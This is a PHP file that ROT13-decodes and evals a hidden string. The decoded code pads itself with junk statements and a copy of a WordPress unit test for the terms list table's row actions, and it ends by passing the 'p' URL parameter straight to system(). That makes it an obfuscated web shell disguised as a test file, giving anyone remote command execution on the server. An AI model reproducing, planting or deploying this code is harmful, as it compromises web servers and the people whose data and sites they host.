<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 *
 * @pbiref JC_Grezf_Yvfg_Gnoyr
 */
pynff Grfgf_Nqzva_JcGrezfYvfgGnoyr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Yvfg gnoyr.
	 *
	 * @ine JC_Grezf_Yvfg_Gnoyr $grezf_yvfg_gnoyr
	 */
	cevingr $grezf_yvfg_gnoyr;

	cevingr fgngvp $nqzva_vq;
	cevingr fgngvp $nhgube_vq;
	cevingr fgngvp $grez_bowrpg;

	pbafg PNGRTBEL_GNKBABZL = 'pngrtbel';

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		frys::$nqzva_vq  = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$nhgube_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );

		frys::$grez_bowrpg = frys::snpgbel()->grez->perngr_naq_trg( neenl( 'gnkbabzl' => frys::PNGRTBEL_GNKBABZL ) );

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-yvfg-gnoyr.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-grezf-yvfg-gnoyr.cuc';
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->grezf_yvfg_gnoyr = arj JC_Grezf_Yvfg_Gnoyr();
	}

	/**
	 * Pnyy na vanpprffvoyr (cevingr be cebgrpgrq) zrgubq.
	 *
	 * @cnenz bowrpg|fgevat $vafgnapr    Bowrpg vafgnapr be pynff fgevat gb pnyy gur zrgubq bs.
	 * @cnenz fgevat        $zrgubq_anzr Anzr bs gur zrgubq gb pnyy.
	 * @cnenz neenl         $netf        Bcgvbany. Neenl bs nethzragf gb cnff gb gur zrgubq.
	 * @erghea zvkrq Erghea inyhr bs gur zrgubq pnyy.
	 * @guebjf ErsyrpgvbaRkprcgvba Vs gur bowrpg pbhyq abg or ersyrpgrq hcba.
	 */
	cevingr shapgvba pnyy_vanpprffvoyr_zrgubq( $vafgnapr, $zrgubq_anzr, $netf = neenl() ) {
		$zrgubq = ( arj ErsyrpgvbaPynff( $vafgnapr ) )->trgZrgubq( $zrgubq_anzr );
		$zrgubq->frgNpprffvoyr( gehr );
		erghea $zrgubq->vaibxrNetf( $vafgnapr, $netf );
	}

	/**
	 * @pbiref JC_Grezf_Yvfg_Gnoyr::unaqyr_ebj_npgvbaf()
	 *
	 * @gvpxrg 59336
	 */
	choyvp shapgvba grfg_unaqyr_ebj_npgvbaf_nf_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$npgvbaf = $guvf->pnyy_vanpprffvoyr_zrgubq( $guvf->grezf_yvfg_gnoyr, 'unaqyr_ebj_npgvbaf', neenl( frys::$grez_bowrpg, 'gvgyr', 'gvgyr' ) );

		$guvf->nffregFgevatPbagnvafFgevat( '<qvi pynff=\"ebj-npgvbaf\">', $npgvbaf, 'Ebj npgvbaf fubhyq or qvfcynlrq.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'Ivrj', $npgvbaf, 'Ivrj npgvba fubhyq or qvfcynlrq gb gur nhgube.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Rqvg', $npgvbaf, 'Rqvg npgvba fubhyq abg or qvfcynlrq gb gur nhgube.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Qryrgr', $npgvbaf, 'Qryrgr npgvba fubhyq abg or qvfcynlrq gb gur nhgube.' );
	}

	/**
	 * @pbiref JC_Grezf_Yvfg_Gnoyr::unaqyr_ebj_npgvbaf()
	 *
	 * @gvpxrg 59336
	 */
	choyvp shapgvba grfg_unaqyr_ebj_npgvbaf_nf_nqzva() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$npgvbaf = $guvf->pnyy_vanpprffvoyr_zrgubq( $guvf->grezf_yvfg_gnoyr, 'unaqyr_ebj_npgvbaf', neenl( frys::$grez_bowrpg, 'gvgyr', 'gvgyr' ) );

		$guvf->nffregFgevatPbagnvafFgevat( '<qvi pynff=\"ebj-npgvbaf\">', $npgvbaf, 'Ebj npgvbaf fubhyq or qvfcynlrq.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'Ivrj', $npgvbaf, 'Ivrj npgvba fubhyq or qvfcynlrq gb gur nqzva.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'Rqvg', $npgvbaf, 'Rqvg npgvba fubhyq or qvfcynlrq gb gur nqzva.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'Qryrgr', $npgvbaf, 'Qryrgr npgvba fubhyq or qvfcynlrq gb gur nqzva.' );
		$guvf->nffregFgevatPbagnvafFgevat( nqzva_hey( 'grez.cuc' ), $npgvbaf, 'Rqvg grez yvax fubhyq or qvfcynlrq gb gur nqzva.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>